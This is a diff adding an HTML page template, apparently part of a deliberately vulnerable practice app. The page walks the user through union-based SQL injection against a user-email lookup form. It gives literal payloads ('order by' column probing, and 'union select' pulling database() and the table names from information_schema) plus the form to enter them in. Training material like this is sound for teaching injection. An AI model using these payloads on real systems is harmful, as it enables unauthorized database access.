@@ -1,0 +1,12 @@
+<a href=/>Index</a><br>
+<h3>Get DB table column count, DB name, DB table names</h3>
+To get column count enter Alex' order by 1 -- - increasing number until you get an error. Last number without error will be column count<br>
+To get DB name Alex' union select null,null, null, database() -- -, null_count=column_count - 1<br>
+To get DB table names Alex' union select null,null, null, table_name from information_schema.tables where table_schema=database() -- -, null_count=column_count - 1<br>
+Enter user name to get user email:<br>
+<form method="POST">
+    <input name="text">
+    <input type="submit">
+</form>
+{{ result }}
+
